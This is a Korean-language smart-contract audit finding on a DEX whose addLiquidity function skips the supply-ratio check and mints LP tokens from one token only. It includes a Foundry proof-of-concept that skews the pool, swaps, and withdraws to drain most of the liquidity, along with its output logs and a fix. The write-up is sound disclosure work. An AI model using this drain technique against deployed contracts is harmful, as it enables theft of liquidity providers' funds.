# DEX - addLiquidity의 유동성 공급비 검증의 부재 및 부적절한 토큰 발급

## 설명

<aside>

### **키워드 : Vulnerability - 유동성 풀 조작 및 부적절한 토큰 발급**

### **심각도 : Critical**

`addLiquidity` 함수내부에서 두 토큰의 유동성 공급량 비율에 대한 검증이 이루어지지 않는다.
이를 악용하여 유동성 풀에 원하는 비율로 토큰을 공급하여 교환비를 조작할 수 있고, 공급량보다 많은 양의 LP토큰을 발급받을 수 있다.

</aside>

```solidity
if (totalSupply() == 0) {
    LPTokenAmount = (tokenXAmount * tokenYAmount) / 10 ** 18;
} else {
    LPTokenAmount = (totalSupply() * tokenXAmount) / reserveX;
}
```

유동성 풀에 초기에 공급된 비율로 공급되는지 검사하고 이를 유동성 풀의 비율이 깨지지 않게 공급되도록 유도해야 한다. 하지만 이에 대한 검증이 이루어지지 않고 유동성 풀에 공급하게 된다.

그리고 이때 LP토큰 발행량은 tokenXAmount에 의존하여 발행되어 실제 공급량과 맞지 않는 토큰량이 발행된다.

즉, 유동성 풀의 비율을 임의로 조작할 수 있고 이는 곧 적절하지 못한 가격으로 토큰을 교환할 수 있으며 LP토큰의 발행량이 잘못 책정되는 요인이 된다.

## PoC

```solidity
function testPOC() external {
        tokenX.transfer(address(0x01), 1 ether);
        tokenY.transfer(address(0x01), 100 ether);

        tokenX.transfer(address(0x02), 100 ether);
        tokenY.transfer(address(0x02), 102 ether);

        vm.startPrank(address(0x01));
        {
            tokenX.approve(address(dex), type(uint).max);
            tokenY.approve(address(dex), type(uint).max);
            uint256 LP1 = dex.addLiquidity(1 ether, 100 ether, 0);
        }
        vm.stopPrank();

        vm.startPrank(address(0x02));
        {
            tokenX.approve(address(dex), type(uint).max);
            tokenY.approve(address(dex), type(uint).max);
            uint256 lp = dex.addLiquidity(100 ether, 1 ether, 0);

            console.log(
                "before swap balance",
                tokenX.balanceOf(address(0x02)),
                tokenY.balanceOf(address(0x02))
            );
            uint res = dex.swap(0, 101 ether, 0);
            console.log(
                "after swap balance",
                tokenX.balanceOf(address(0x02)),
                tokenY.balanceOf(address(0x02))
            );

            dex.removeLiquidity(lp, 0, 0);
            console.log(
                "Attack result",
                tokenX.balanceOf(address(0x02)),
                tokenY.balanceOf(address(0x02))
            );
        }
        vm.stopPrank();
    }
```

```solidity
[PASS] testPOC() (gas: 401295)
Logs:
  before swap balance 0 101000000000000000000
  after swap balance 50474737368684342172 0
	Attack result 100499749874937468734 200000000000000000000
```

초기 유동성 풀에 A가 x토큰과 y토큰을 1:100 비율로 토큰을 공급한다. 이는 곧 실제 토큰의 가치에 따른 교환비라고 볼 수 있다.

이때 유저 B가 기존의 유동성 비율과는 무관하게 x토큰과 y토큰을 100:1 비율로 공급한다. 이때 유동성 풀에는 1:1 로 토큰이 존재한다. 이후 swap을 통해 y토큰을 x토큰으로 변환한다.

유동성풀의 비율이 본래 가치를 따르지 않고 잘못된 토큰 비율로 계산되어 변환된다.

```solidity
uint256 y_value = (tokenYAmount / 1000) * 999;
amountX = k / (amountY + y_value);
outputAmount = reserveX - amountX;
Y.transferFrom(msg.sender, address(this), tokenYAmount);
X.transfer(msg.sender, outputAmount);
```

이 결과로 본래 가치는 100:1 이지만 교환의 결과는 y토큰 100개가 x토큰 약 50개로 변환되는 것을 확인가능하다. 해당 DEX의 유동성 풀의 비율이 깨졌기 때문이다.

이후 LP토큰을 반환하여 유동성을 제거한다. 유저 B의 토큰 발행량은 x토큰 유동성 공급량에만 의존하기에 발행된 토큰의 100/101 만큼을 소유하고 있는 상태이다.

초기 자본은 x토큰 100 ether, y토큰 102 ether였지만, 교환 이후에는 dex에 존재하던 x토큰과 y토큰 대부분(100/101)을 탈취한 것을 확인할 수 있다.

## 파급력

Flash loan 등을 통해 유동성을 공급하여 유동성 비를 깨뜨린 후 실제 가치비가 아닌 잘못된 비율로 교환이 가능하며, 교환 후 유동성을 제거하면 공급량보다 많은 양을 반환받을 수 있기에 DEX에서 제공하는 가치를 신뢰할 수 없으며 DEX의 유동성을 탈취할 수 있다.

누군가가 위의 PoC 처럼 DEX의 유동성 풀에 버금가는 금액을 들고 나타난다면 유동성 풀의 모든 토큰을 탈취하는 것도 불가능한 일이 아닐 것이다.

특정 조건이 필요없어 공격 난이도가 낮음에도 불구하고 유동성 풀을 조작하여 이득을 취할 수 있기에 위험도는 매우 높다고 볼 수 있다.

## 해결 방안

```solidity
if (totalSupply() == 0) {
            LPTokenAmount = (tokenXAmount * tokenYAmount) / 10 ** 18;
        } else {
            require(
                tokenXAmount * reserveY == tokenYAmount * reserveX,
                "imbalance add liquidity"
            );
            LPTokenAmount = (totalSupply() * tokenXAmount) / reserveX;
        }
```

초회 공급이 아닌 경우에는 공급비가 유동성 풀의 비율과 동일한지 검사해야 한다.
